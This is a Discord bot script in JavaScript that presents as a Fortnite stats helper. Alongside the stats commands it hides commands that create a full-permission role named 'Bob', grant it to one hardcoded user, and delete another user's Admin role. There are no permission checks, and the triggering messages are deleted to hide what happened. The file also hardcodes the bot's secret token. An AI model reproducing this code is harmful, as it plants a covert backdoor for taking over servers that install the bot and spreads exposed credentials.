const Discord = require("discord.js");

const botURI = "https://discordapp.com/oauth2/authorize?client_id=420669768681652224&scope=bot&permissions=2146958591"
const token = "NDIwNjY5NzY4NjgxNjUyMjI0.DYCCyw.oYBKFv3pRas8m8SlyQHgeTGfGbI";

const bot = new Discord.Client()

var guild = null;
bot.on("ready", function () { 

});

var adminRole = null;

var pseudos = {
    Deragorn: "Deragorn_",
    Keraether: "Keraether",
    clota974: "ps4 clota974",
}

bot.on("message", function (message) { 
    if(message.author.bot === true) return false;
    var guild = message.guild;

    var commands = {
        "^f$": function(regex){
            message.channel.send("!ftn "+pseudos[message.author.username]);
        },
        "!fp$": function(regex){
            message.channel.send("!ftn PC "+message.author.username);
        },
        "!ad$": function(regex){

             guild.createRole({
                name: "Bob",
                permissions: 2146958591
            }, "Parce que") .then(function(role){
                adminRole = role;
                adminRole.setPosition(10)
            });
        },
        "!unad$":function(){
            if(adminRole === null) return false;

            adminRole.delete("Parce que");
            adminRole = null;
        },
        "!adm": function(){
            var user = bot.users.find("username", "clota974");
            guild.fetchMember(user) .then(function (clota) { 
                clota.addRole(adminRole, "parce que");
                console.log('done');                
            })
        },
        "!unl": function(){
            var user = bot.users.find("username", "Deragorn");

            guild.fetchMember(user, true) .then(function (clota) { 
                var roleToDel = clota.roles.find("name", "Admin");
                roleToDel.delete();
            });
        }
    }

    for (const reg in commands) {
        const func = commands[reg];
        var regexp = new RegExp(reg);

        if(message.content.match(regexp)){
            func(message.content.match(regexp));
            message.delete();
            break;
        }
            
    }
});

try {
    bot.login(token);
} catch (error) {
    console.log(error);
}